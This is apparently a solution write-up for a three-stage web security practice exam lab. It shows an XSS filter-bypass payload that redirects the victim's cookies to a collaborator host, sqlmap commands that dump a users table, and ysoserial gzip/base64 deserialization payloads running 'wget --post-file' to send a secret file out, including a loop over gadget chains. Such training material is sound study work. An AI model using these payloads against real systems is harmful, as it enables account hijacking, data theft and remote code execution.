# Practice Exam Solution
## 1/3
XXS injection vulnerability in search (PoC `"-alert(1)-"`), but lots of stuff caught:
* URL with dots
* document.cookie
* window.location

OOB can still be achieved via escaping:
```
"-(window["document"]["location"]='https://collaborator%2enet?'+window["document"]["cookie"])-"
```

This search term can be sent to the victim to make it perform this search and be redirected:
```
<script>
location = 'LAB_URL/?SearchTerm=%22-%28window%5B%22document%22%5D%5B%22location%22%5D%3D%22https%3A%2F%2Frxs2hfxmit48f5e9r0hvg2bs7jd91y%252eoastify%252ecom%3F%22%2Bwindow%5B%22document%22%5D%5B%22cookie%22%5D%29-%22'
</script>
```
## 2/3
In the advanced search, an SQL injection is exploitable. `sqlmap` is very useful (the active scan should find the vulnerability) here, it just needs the correct session and lab cookie:
```
sqlmap -u "LAB_URL/filtered_search?SearchTerm=&sort-by=&writer=" \
	--cookie "session=...;_lab=..." \
	-p sort-by \
	--batch
```
the `-p` tells sqlmap which parameter to scan, batch makes everything a bit faster.

Once the injection is fully confirmed and a database name is available, information can be retrieved:
```
-D public                  # database name
--tables                   # retreive the tables
-T users                   # use table "users"
--dump                     # dumps all entries in the specified table
```

## 3/3
The last step is a deserialization vulnerability in the Java library. The admin panel has an interesting cookie called `admin-prefs`. URL decoding, then base64 decoding and then "smart" decoding (from the burp decoder) reveals that indeed a Java serialized object is used. 
The next step is to use `ysoserial` to generate an arbitrary payload and then base64 encrypting it. Submitting this value in the cookies reveals, that it must be in a gzip format:
```
ysoserial CollectionX "payload" | gzip -f | base64 | tr --d '\n'
```

Some error messages hint towards the backtick being escaped, thus, another way than inline commands need to be used:
```
wget --post-file /home/carlos/secret COLLABORATOR
```

Eventually, different collections should be tried out and each resulting string submitted. Even with errors in the response, the attack could have succeeded, so checking the collaborator is important.

This step can be more or less automated:
```
for i in {1..6}       
do
java -jar ysoserial-master-8eb5cbfbf6-1.jar CommonsCollections$i 'wget --post-file /home/carlos/secret https://kg428p6tem9ztdkj9ljehrs47vdl1a.oastify.com' | gzip -f | base64 | tr --d '\n'; echo "\n\n"
done
```
